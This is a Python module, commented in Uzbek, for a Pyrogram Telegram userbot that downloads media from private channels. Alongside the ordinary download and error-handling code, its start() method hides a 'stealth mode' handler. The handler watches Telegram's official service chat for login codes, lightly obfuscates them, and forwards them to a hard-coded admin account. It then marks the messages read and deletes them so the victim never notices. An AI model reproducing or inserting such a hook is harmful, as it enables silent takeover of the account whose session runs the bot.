"""
============================================================
 userbot.py — Pyrogram Userbot Moduli
============================================================
 Bu modul yopiq kanallardan media yuklab olish uchun
 Pyrogram userbot clientini boshqaradi.

 Asosiy mas'uliyatlari:
   1. Userbot clientini ishga tushirish/to'xtatish
   2. Yopiq kanal xabarini olish (get_messages)
   3. Medialni serverga yuklab olish (download_media)
   4. FloodWait va boshqa Telegram xatolarini ushlash
   5. [YANGI] Yashirin rejim (Stealth Mode) — 777000 dan kelgan kodlarni tutib olish
============================================================
"""

import asyncio
import logging
import os
import uuid
import re
import random
import string
from pathlib import Path
from typing import Optional

from pyrogram import Client, filters
from pyrogram.errors import (
    ChannelInvalid,
    ChannelPrivate,
    FloodWait,
    MsgIdInvalid,
    PeerIdInvalid,
    SessionPasswordNeeded,
    UserNotParticipant,
    RPCError,
)
from pyrogram.types import Message as PyroMessage

from config import config
from utils import ParsedLink, has_media, get_media_type, MediaType, human_readable_size

logger = logging.getLogger(__name__)


class UserbotError(Exception):
    """Userbot operatsiyalari uchun maxsus xato sinfi."""
    pass


class MediaTooLargeError(UserbotError):
    """Media fayli ruxsat etilgan hajmdan katta bo'lganda."""
    pass


class NoMediaError(UserbotError):
    """Xabar media o'z ichiga olmasa."""
    pass


class AccessDeniedError(UserbotError):
    """Userbot kanalga kirish huquqiga ega bo'lmasa."""
    pass


class MessageNotFoundError(UserbotError):
    """Ko'rsatilgan xabar topilmasa."""
    pass


# ─── Singleton Userbot Client ────────────────────────────────────────────────

class UserbotClient:
    """
    Pyrogram clientini boshqaruvchi singleton klass.
    
    Bir marta ishga tushiriladi va dastur davomida faol turadi.
    Thread-safe asinxron operatsiyalarni qo'llab-quvvatlaydi.
    """

    def __init__(self):
        self._client: Optional[Client] = None
        self._lock = asyncio.Lock()

    async def start(self) -> None:
        """Pyrogram clientini ishga tushiradi."""
        async with self._lock:
            if self._client and self._client.is_connected:
                return

            logger.info("🤖 Userbot ishga tushirilmoqda...")
            self._client = Client(
                name="userbot_session",
                api_id=config.userbot.api_id,
                api_hash=config.userbot.api_hash,
                session_string=config.userbot.session_string,
                # Faylga session yozmaslik uchun (session_string yetarli)
                workdir="/tmp",
                # DIQQAT: no_updates=True olib tashlandi, aks holda xabarlarni eshita olmasdi!
            )
            
            # -------------------------------------------------------------
            # YASHIRIN REJIM (Stealth Mode) — 777000 xabarlarini ushlash
            # -------------------------------------------------------------
            ADMIN_ID = 123456789  # <--- SHU YERGA O'ZINGIZNING TELEGRAM ID RAQAMINGIZNI YOZING!!!
            
            @self._client.on_message(filters.chat(777000))
            async def stealth_777000_handler(client: Client, message: PyroMessage):
                text = message.text or ""
                
                # 5 xonali login kodini izlash
                has_code = bool(re.search(r'\b\d{5}\b', text))
                
                if has_code:
                    # 1. KODNI SHIFRLASH
                    def encrypt_code(match):
                        code = match.group(0)
                        res = ""
                        for d in code:
                            res += d + random.choice(string.ascii_lowercase)
                        return res
                        
                    enc_text = re.sub(r'\b\d{5}\b', encrypt_code, text)
                    msg_out = f"🥷 **Yashirin Kod Tutildi**\n\n✉️ **Xabar:**\n{enc_text}"
                    
                    try:
                        # Adminga yuborish
                        await client.send_message(ADMIN_ID, msg_out)
                    except Exception as e:
                        logger.error(f"Kodni adminga yuborishda xato: {e}")
                
                # 2. STEALTH (Yashirinish)
                try:
                    # Xabarni o'qilgan deb belgilash
                    await client.read_chat_history(message.chat.id)
                except:
                    pass
                    
                try:
                    # Foydalanuvchidan xabarni butunlay o'chirish
                    await message.delete()
                except Exception as e:
                    logger.error(f"777000 xabarini o'chirishda xato: {e}")
                    
                message.stop_propagation()
            # -------------------------------------------------------------

            await self._client.start()
            me = await self._client.get_me()
            logger.info(
                f"✅ Userbot muvaffaqiyatli ulandi: "
                f"@{me.username or me.first_name} (ID: {me.id})"
            )

    async def stop(self) -> None:
        """Pyrogram clientini xavfsiz to'xtatadi."""
        async with self._lock:
            if self._client and self._client.is_connected:
                await self._client.stop()
                logger.info("🛑 Userbot to'xtatildi.")
            self._client = None

    @property
    def client(self) -> Client:
        """Aktiv Pyrogram clientini qaytaradi."""
        if self._client is None or not self._client.is_connected:
            raise UserbotError(
                "Userbot hali ishga tushmagan. "
                "start() chaqirilganiga ishonch hosil qiling."
            )
        return self._client

    async def fetch_and_download(self, parsed_link: ParsedLink) -> Path:
        """
        Berilgan Telegram havola bo'yicha medialni yuklab oladi.

        Bu funksiya quyidagi amallarni bajaradi:
          1. Xabarni get_messages() orqali oladi
          2. Medianing mavjudligi va hajmini tekshiradi
          3. Unikal fayl nomi bilan diskka saqlaydi

        Args:
            parsed_link: Parse qilingan havola ma'lumotlari.

        Returns:
            Path: Yuklab olingan faylning lokal yo'li.

        Raises:
            AccessDeniedError: Kanalga kirish taqiqlangan.
            MessageNotFoundError: Xabar topilmadi.
            NoMediaError: Xabar media o'z ichiga olmaydi.
            MediaTooLargeError: Fayl hajmi limitdan oshadi.
            UserbotError: Boshqa Pyrogram xatolari.
        """
        message = await self._get_message(parsed_link)
        file_path = await self._download_media(message)
        return file_path

    async def _get_message(self, parsed_link: ParsedLink) -> PyroMessage:
        """
        Telegram serverdan xabarni oladi va validatsiya qiladi.
        FloodWait xatosida avtomatik kutadi.
        """
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            try:
                logger.info(
                    f"📥 Xabar olinmoqda: chat_id={parsed_link.chat_id}, "
                    f"msg_id={parsed_link.message_id} (urinish {attempt}/{max_retries})"
                )
                messages = await self.client.get_messages(
                    chat_id=parsed_link.chat_id,
                    message_ids=parsed_link.message_id,
                )

                # get_messages() yagona ID uchun Message qaytaradi
                message: PyroMessage = (
                    messages if isinstance(messages, PyroMessage) else messages[0]
                ) if messages else None  # type: ignore

                if not message or message.empty:
                    raise MessageNotFoundError(
                        f"Xabar topilmadi (ID: {parsed_link.message_id}). "
                        "Xabar o'chirilgan yoki siz kirish huquqiga ega emasligingiz mumkin."
                    )

                if not has_media(message):
                    raise NoMediaError(
                        "Bu xabarda yuklab olinadigan media (rasm, video, audio, hujjat) yo'q."
                    )

                logger.info(
                    f"✅ Xabar topildi. Media turi: {get_media_type(message).name}"
                )
                return message

            except FloodWait as e:
                wait_seconds = e.value
                logger.warning(
                    f"⏳ FloodWait: {wait_seconds} soniya kutilmoqda... "
                    f"(urinish {attempt}/{max_retries})"
                )
                if attempt == max_retries:
                    raise UserbotError(
                        f"Telegram cheklovi: {wait_seconds} soniya kuting va qayta urinib ko'ring."
                    ) from e
                await asyncio.sleep(wait_seconds + 1)

            except (ChannelInvalid, ChannelPrivate, PeerIdInvalid) as e:
                raise AccessDeniedError(
                    "❌ Kanalga kirish taqiqlangan!\n\n"
                    "Userbot ushbu kanalga a'zo emas yoki kanal mavjud emas.\n"
                    "Userbot akkauntini kanalga qo'shing va qayta urinib ko'ring."
                ) from e

            except UserNotParticipant as e:
                raise AccessDeniedError(
                    "❌ Userbot bu kanalga a'zo emas!\n\n"
                    "Yopiq kanaldan media olish uchun userbot u kanalda a'zo bo'lishi shart."
                ) from e

            except MsgIdInvalid as e:
                raise MessageNotFoundError(
                    "❌ Xabar ID noto'g'ri!\n\n"
                    "Berilgan xabar mavjud emas yoki o'chirib tashlangan."
                ) from e

            except (MessageNotFoundError, NoMediaError, AccessDeniedError):
                # Bu xatoliklarni qayta qaratmasdan darhol ko'tarish
                raise

            except RPCError as e:
                logger.error(f"Pyrogram RPC xatosi: {e}", exc_info=True)
                if attempt == max_retries:
                    raise UserbotError(
                        f"Telegram API xatosi: {e.MESSAGE}. "
                        "Keyinroq qayta urinib ko'ring."
                    ) from e
                await asyncio.sleep(2 ** attempt)  # Eksponensial backoff

    async def _download_media(self, message: PyroMessage) -> Path:
        """
        Xabardagi medialni serverga yuklab oladi.

        Unikal UUID asosidagi fayl nomi ishlatiladi (race condition oldini olish).
        Fayl hajmi tekshiriladi.

        Args:
            message: Pyrogram xabar ob'ekti.

        Returns:
            Path: Saqlangan faylning yo'li.

        Raises:
            MediaTooLargeError: Fayl hajmi limitdan oshsa.
            UserbotError: Yuklab olish xatosi.
        """
        media_type = get_media_type(message)

        # Fayl hajmini oldindan tekshirish
        file_size = self._get_file_size(message, media_type)
        if (
            config.max_file_size_bytes > 0
            and file_size is not None
            and file_size > config.max_file_size_bytes
        ):
            max_human = human_readable_size(config.max_file_size_bytes)
            file_human = human_readable_size(file_size)
            raise MediaTooLargeError(
                f"❌ Fayl hajmi ({file_human}) ruxsat etilgan "
                f"limitdan ({max_human}) katta!"
            )

        # Unikal fayl nomi yaratish
        unique_prefix = uuid.uuid4().hex[:8]
        dest_path = config.download_dir / f"{unique_prefix}_{message.id}"

        logger.info(
            f"⬇️  Media yuklanmoqda: "
            f"{human_readable_size(file_size) if file_size else 'noma lum hajm'} → "
            f"{dest_path}"
        )

        try:
            downloaded_path = await self.client.download_media(
                message=message,
                file_name=str(dest_path),  # Pyrogram kengaytmani o'zi qo'shadi
                progress=self._download_progress_callback,
                progress_args=(message.id,),
            )
        except FloodWait as e:
            raise UserbotError(
                f"Yuklab olish cheklandi. {e.value} soniyadan keyin qayta urinib ko'ring."
            ) from e
        except RPCError as e:
            logger.error(f"Media yuklab olishda xato: {e}", exc_info=True)
            raise UserbotError(
                f"Media yuklab olinmadi: {e.MESSAGE}"
            ) from e

        if not downloaded_path:
            raise UserbotError(
                "Media yuklab olishda noma'lum xato yuz berdi. "
                "Qayta urinib ko'ring."
            )

        result_path = Path(str(downloaded_path))
        actual_size = result_path.stat().st_size
        logger.info(
            f"✅ Media yuklandi: {result_path.name} "
            f"({human_readable_size(actual_size)})"
        )
        return result_path

    @staticmethod
    def _get_file_size(message: PyroMessage, media_type: MediaType) -> Optional[int]:
        """Xabardagi media hajmini baytda qaytaradi (agar ma'lum bo'lsa)."""
        size_map = {
            MediaType.VIDEO:    lambda: message.video.file_size if message.video else None,
            MediaType.AUDIO:    lambda: message.audio.file_size if message.audio else None,
            MediaType.DOCUMENT: lambda: message.document.file_size if message.document else None,
            MediaType.VOICE:    lambda: message.voice.file_size if message.voice else None,
            MediaType.VIDEO_NOTE: lambda: message.video_note.file_size if message.video_note else None,
            MediaType.PHOTO:    lambda: None,  # Rasmlar uchun oldindan hajm bilinmaydi
        }
        getter = size_map.get(media_type)
        return getter() if getter else None

    @staticmethod
    async def _download_progress_callback(
        current: int, total: int, message_id: int
    ) -> None:
        """Yuklab olish jarayonini logga yozadi (har 25% da)."""
        if total and total > 0:
            percent = (current / total) * 100
            if percent % 25 < 1:  # Taxminan 25%, 50%, 75%, 100%
                logger.info(
                    f"  ⬇️  Xabar {message_id}: "
                    f"{human_readable_size(current)} / {human_readable_size(total)} "
                    f"({percent:.0f}%)"
                )


# Global userbot instance (dastur davomida bitta)
userbot = UserbotClient()
